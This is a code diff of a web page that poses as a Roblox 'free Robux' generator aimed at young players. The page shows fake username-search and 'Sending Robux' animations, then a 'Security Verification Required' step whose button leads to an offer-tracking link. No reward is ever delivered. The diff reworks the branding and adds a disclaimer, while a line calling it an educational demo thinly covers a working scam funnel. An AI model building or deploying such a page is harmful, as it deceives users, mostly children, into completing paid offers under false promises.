@@ -1,9 +1,9 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Roblox</title>
-  <link rel="icon" type="image/x-icon" href="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700458ba7cab444a522b7c8e71b8233099cf2c.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -61,13 +61,11 @@
       overflow: hidden;
       flex-shrink: 0;
       background: #161b22;
-    }
-
-    .profileimg img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8b949e;
+      font-size: 20px;
     }
 
     .profile .text h4 {
@@ -80,15 +78,10 @@
     }
 
     .badge {
-      width: 18px;
-      height: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       flex-shrink: 0;
-    }
-
-    .badge img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
     }
 
     .profile .text p {
@@ -157,16 +150,14 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    .card .logo {
-      width: 110px;
+    .card .logo-text {
+      font-family: 'Arial Black', Impact, sans-serif;
+      font-size: 34px;
+      font-weight: 900;
+      letter-spacing: -2px;
+      color: #ffffff;
+      text-transform: uppercase;
       margin-bottom: 12px;
-    }
-
-    .card .logo img {
-      width: 100%;
-      height: auto;
-      display: block;
-      border-radius: 4px;
     }
 
     .card .title {
@@ -184,11 +175,6 @@
       margin-bottom: 20px;
       max-width: 360px;
       font-weight: 400;
-    }
-
-    .card .sub b {
-      color: #c9d1d9;
-      font-weight: 700;
     }
 
     .card input {
@@ -237,106 +223,61 @@
     }
     .card .btn-primary:active { transform: scale(0.97); }
 
-    .robux-list {
+    /* --- Reward Grid Replacement --- */
+    .reward-grid {
       width: 100%;
-      margin-top: 6px;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 8px;
     }
 
-    .row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 8px 14px 8px 18px;
+    .reward-option {
       background: #0d1117;
-      border-radius: 6px;
       border: 1px solid #21262d;
-      transition: all 0.2s ease;
-      gap: 10px;
-      min-height: 58px;
-      touch-action: manipulation;
-    }
-
-    .row:hover {
-      border-color: #30363d;
-    }
-
-    .price {
-      font-size: 13px;
-      font-weight: 600;
-      color: #8b949e;
-      min-width: 50px;
-      text-align: left;
-    }
-
-    .details {
-      background: #21262d;
-      padding: 8px 20px;
-      border-radius: 6px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
+      border-radius: 8px;
+      padding: 20px 10px;
+      text-align: center;
       cursor: pointer;
       transition: all 0.2s ease;
-      font-weight: 700;
-      color: #e6edf3;
-      font-size: 15px;
-      border: 1px solid #30363d;
-      font-family: 'Inter', sans-serif;
-      min-width: 120px;
-      height: 44px;
-      flex-shrink: 0;
       touch-action: manipulation;
+      user-select: none;
     }
 
-    .details:hover {
-      background: #30363d;
-      border-color: #484f58;
-    }
-    .details:active {
-      transform: scale(0.95);
-      background: #484f58;
+    .reward-option:hover {
+      border-color: #58a6ff;
+      background: rgba(88, 166, 255, 0.06);
+      transform: translateY(-2px);
     }
 
-    .details .pic {
-      width: 20px;
-      height: 20px;
-      flex-shrink: 0;
+    .reward-option:active {
+      transform: scale(0.96);
     }
 
-    .details .pic img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
+    .reward-option h3 {
+      font-size: 20px;
+      font-weight: 800;
+      color: #ffffff;
+      margin-bottom: 4px;
     }
 
-    .details span:last-child {
-      min-width: 42px;
-      text-align: center;
+    .reward-option p {
+      font-size: 12px;
+      color: #8b949e;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
     }
 
     .loader {
       width: 72px;
       height: 72px;
       margin: 8px auto;
-      animation: pulse 1.4s ease-in-out infinite;
-    }
-
-    .loader img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-      border-radius: 6px;
-      border: 1px solid #21262d;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(0.92); opacity: 0.5; }
-      50% { transform: scale(1.06); opacity: 1; }
-      100% { transform: scale(0.92); opacity: 0.5; }
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 44px;
+      color: #58a6ff;
     }
 
     .status-text {
@@ -470,12 +411,22 @@
     /* --- Verification Info Card Additions --- */
     .info-card {
       background: #0d1117;
-      width: 100%; border-radius: 8px;
-      padding: 20px; border: 1px solid #21262d;
-      margin-top: 15px; margin-bottom: 20px;
+      width: 100%;
+      border-radius: 8px;
+      padding: 20px;
+      border: 1px solid #21262d;
+      margin-top: 15px;
+      margin-bottom: 20px;
       text-align: left;
     }
-    .card-header { color: #e6edf3; font-weight: 800; font-size: 1.1rem; margin-bottom: 20px; display: flex; justify-content: space-between; }
+    .card-header {
+      color: #e6edf3;
+      font-weight: 800;
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: space-between;
+    }
     .card-header span.highlight { color: #58a6ff; }
     .card-header i { font-size: 0.9rem; margin-left: 5px; color: #8b949e; }
     
@@ -489,10 +440,17 @@
       background-color: #238636;
       color: #ffffff;
       width: 100%;
-      padding: 16px; border: none; border-radius: 6px;
-      font-size: 16px; font-weight: 700; cursor: pointer;
+      padding: 16px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
       transition: all 0.2s ease;
-      display: flex; align-items: center; justify-content: center; gap: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
       font-family: 'Inter', sans-serif;
     }
     .claim-btn:hover { background: #2ea043; }
@@ -500,31 +458,19 @@
 
     @media (max-width: 400px) {
       .card { padding: 24px 18px; }
-      .card .logo { width: 90px; }
-      .row { padding: 6px 10px; min-height: 50px; }
-      .details { min-width: 100px; height: 40px; font-size: 13px; padding: 6px 12px; }
+      .card .logo-text { font-size: 28px; }
       .navbar { padding: 0 16px; height: 64px; }
-      .profileimg { width: 36px; height: 36px; }
+      .profileimg { width: 36px; height: 36px; font-size: 16px; }
       .profile .text h4 { font-size: 14px; }
       .navbar button { padding: 6px 14px; font-size: 12px; }
       .card .title { font-size: 20px; }
+      .reward-option { padding: 14px 8px; }
+      .reward-option h3 { font-size: 17px; }
     }
 
     @media (min-width: 768px) {
       .card { padding: 40px 36px; max-width: 520px; }
-      .details { min-width: 140px; height: 50px; font-size: 16px; }
-      .row { padding: 10px 18px; min-height: 64px; }
-    }
-
-    @media (max-height: 640px) and (orientation: landscape) {
-      .hero { padding: 12px 16px; min-height: calc(100vh - 64px); }
-      .card { padding: 16px 18px; max-height: 90vh; overflow-y: auto; }
-      .card .logo { width: 60px; margin-bottom: 4px; }
-      .row { min-height: 38px; padding: 4px 10px; }
-      .details { height: 34px; min-width: 90px; font-size: 12px; padding: 4px 12px; }
-      .card input { padding: 8px 14px; font-size: 13px; }
-      .card .btn-primary { padding: 8px; font-size: 14px; margin-top: 8px; }
-      .navbar { height: 52px; padding: 0 12px; }
+      .reward-option { padding: 24px 12px; }
     }
   </style>
 </head>
@@ -534,13 +480,13 @@
     <nav class="navbar">
         <div class="profile">
             <div class="profileimg">
-                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="avatar">
+                <i class="fa-solid fa-user-secret"></i>
             </div>
             <div class="text">
                 <h4>
-                    Claim Robux
+                    Claim Rewards
                     <span class="badge">
-                        <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700458ba7cab444a522b7c8e71b8233099cf2c.png" alt="badge">
+                        <i class="fa-solid fa-circle-check" style="color: #2ea043; font-size: 14px;"></i>
                     </span>
                 </h4>
                 <p>Partners Program</p>
@@ -554,10 +500,8 @@
 
         <!-- CARD 1: Enter Username -->
         <div class="card active" id="card-username">
-            <div class="logo">
-                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" alt="Roblox">
-            </div>
-            <p class="sub">Enter your Roblox username to start getting free Robux</p>
+            <div class="logo-text">ROBLOX</div>
+            <p class="sub">Enter your Roblox username to start getting free robux</p>
             <input type="text" id="username-input" placeholder="Type your username ..." maxlength="30" inputmode="text" autocomplete="username">
             <button class="btn-primary" id="continue-btn">Continue</button>
         </div>
@@ -565,43 +509,32 @@
         <!-- CARD 2: Searching -->
         <div class="card" id="card-searching">
             <div class="loader">
-                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="loading">
+                <i class="fa-solid fa-circle-notch fa-spin"></i>
             </div>
             <p class="status-text" id="searching-text">Searching for <b>...</b></p>
         </div>
 
-        <!-- CARD 3: Choose Amount -->
+        <!-- CARD 3: Choose Amount (Replaced with Prize Tier Grid) -->
         <div class="card" id="card-amount">
-            <span class="title">💰 Choose Amount</span>
-            <p class="sub" style="margin-bottom:4px;">Select how many Robux you want</p>
-            <div class="robux-list">
-                <div class="row">
-                    <span class="price">$0.00</span>
-                    <button class="details" data-amount="500">
-                        <span class="pic"><img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="rbx"></span>
-                        <span>500</span>
-                    </button>
+            <span class="title">🎁 Select Reward Tier</span>
+            <p class="sub" style="margin-bottom: 12px;">Select your desired Robux gift card tier.</p>
+            
+            <div class="reward-grid">
+                <div class="reward-option" data-amount="800">
+                    <h3>800</h3>
+                    <p>Robux Tier</p>
                 </div>
-                <div class="row">
-                    <span class="price">$0.00</span>
-                    <button class="details" data-amount="750">
-                        <span class="pic"><img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="rbx"></span>
-                        <span>750</span>
-                    </button>
+                <div class="reward-option" data-amount="1,200">
+                    <h3>1,200</h3>
+                    <p>Robux Tier</p>
                 </div>
-                <div class="row">
-                    <span class="price">$0.00</span>
-                    <button class="details" data-amount="1000">
-                        <span class="pic"><img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="rbx"></span>
-                        <span>1,000</span>
-                    </button>
+                <div class="reward-option" data-amount="1,700">
+                    <h3>1,700</h3>
+                    <p>Robux Tier</p>
                 </div>
-                <div class="row">
-                    <span class="price">$0.00</span>
-                    <button class="details" data-amount="1500">
-                        <span class="pic"><img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="rbx"></span>
-                        <span>1,500</span>
-                    </button>
+                <div class="reward-option" data-amount="4,500">
+                    <h3>4,500</h3>
+                    <p>Robux Tier</p>
                 </div>
             </div>
         </div>
@@ -609,16 +542,14 @@
         <!-- CARD 4: Sending -->
         <div class="card" id="card-sending">
             <div class="loader">
-                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="sending">
+                <i class="fa-solid fa-circle-notch fa-spin"></i>
             </div>
-            <p class="status-text" id="sending-text">Sending Robux to <b>...</b></p>
+            <p class="status-text" id="sending-text">Sending robux to <b>...</b></p>
         </div>
 
-        <!-- CARD 5: Verify (Integrated with Instruction Checklist & CTA Button) -->
+        <!-- CARD 5: Verify -->
         <div class="card" id="card-verify">
-            <div class="logo" style="width:100px; margin: 0 auto 10px;">
-                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" alt="Roblox">
-            </div>
+            <div class="logo-text" style="margin: 0 auto 10px;">ROBLOX</div>
 
             <div class="info-card">
                 <div class="card-header">
@@ -635,12 +566,12 @@
                 </div>
                 <div class="list-item">
                     <div class="icon-check"><i class="fa-regular fa-circle-check"></i></div>
-                    <div class="text-content"><h4>Get Rewarded</h4><p>Receive your reward immediately after completion.</p></div>
+                    <div class="text-content"><h4>Get Rewarded</h4><p>Upon successful completion of the deals, you will be immediately eligible.</p></div>
                 </div>
             </div>
 
             <button class="claim-btn" onclick="window.location.href='https://offertrk.org/cl/i/34jvrm'">
-                <i class="fa-solid fa-lock-open"></i> Verify & Claim Robux
+                <i class="fa-solid fa-lock-open"></i> Verify & Continue
             </button>
         </div>
 
@@ -652,9 +583,9 @@
       <h2>📘 How it works</h2>
       <p>
         <strong>1.</strong> Enter your Roblox username.<br>
-        <strong>2.</strong> Select the amount of Robux you want.<br>
+        <strong>2.</strong> Select your desired Robux tier.<br>
         <strong>3.</strong> Complete the quick verification task.<br>
-        <strong>4.</strong> Enjoy your Robux in your account!
+        <strong>4.</strong> Enjoy your robux in your account!
       </p>
       <br>
       <p style="font-size:13px;color:#4a5260;">⚠️ Demo for educational purposes only.</p>
@@ -662,8 +593,8 @@
   </div>
 
   <footer class="footer">
-    <span>Copyright © 2026</span>
-    <p>This website is protected — unauthorized use may result in legal action under <strong>DMCA</strong>.</p>
+    <span>Disclaimer</span>
+    <p>This is an independent project. We are not affiliated with, endorsed, or sponsored by Roblox Corporation. All trademarks belong to their respective owners.</p>
   </footer>
 
     <!-- ===== MAIN SCRIPTS ===== -->
@@ -684,7 +615,7 @@
             const searchingText = document.getElementById('searching-text');
             const sendingText = document.getElementById('sending-text');
 
-            const amountButtons = document.querySelectorAll('.details');
+            const amountButtons = document.querySelectorAll('.reward-option');
             const modal = document.getElementById('how-modal');
             const modalBtn = document.getElementById('how-it-works-btn');
             const modalClose = document.getElementById('modal-close');
@@ -707,19 +638,6 @@
                 if (!toast) {
                     toast = document.createElement('div');
                     toast.id = 'toast';
-                    toast.style.cssText = `
-                        position: fixed; bottom: 30px; left: 20px; right: 20px;
-                        background: rgba(22, 28, 36, 0.95); backdrop-filter: blur(20px);
-                        padding: 16px 24px; border-radius: 16px;
-                        border-left: 4px solid #00b06f;
-                        box-shadow: 0 16px 60px rgba(0, 0, 0, 0.8);
-                        display: flex; align-items: center; gap: 16px;
-                        opacity: 0; transform: translateY(40px);
-                        transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
-                        pointer-events: none; z-index: 9999;
-                        max-width: 480px; margin: 0 auto;
-                        color: #eef2f7; font-family: 'Inter', sans-serif;
-                    `;
                     document.body.appendChild(toast);
                 }
 
@@ -754,19 +672,19 @@
                 searchingText.innerHTML = `Searching for <b>${currentUsername}</b> ...`;
                 await sleep(1800);
                 showCard(cardAmount);
-                showToast(`Welcome ${currentUsername}! Choose your amount`, 'success');
+                showToast(`Welcome ${currentUsername}! Choose your tier`, 'success');
             });
 
             usernameInput.addEventListener('keydown', (e) => {
                 if (e.key === 'Enter') continueBtn.click();
             });
 
-            // === 2. AMOUNT → SENDING ===
+            // === 2. TIER SELECT → SENDING ===
             amountButtons.forEach(btn => {
                 btn.addEventListener('click', async () => {
                     const amount = btn.getAttribute('data-amount') || '???';
                     showCard(cardSending);
-                    sendingText.innerHTML = `Sending <b>${amount}</b> Robux to <b>${currentUsername}</b> ...`;
+                    sendingText.innerHTML = `Sending <b>${amount}</b> robux to <b>${currentUsername}</b> ...`;
                     await sleep(2000);
                     showCard(cardVerify);
                     showToast(`Security Verification Required!`, 'warning');
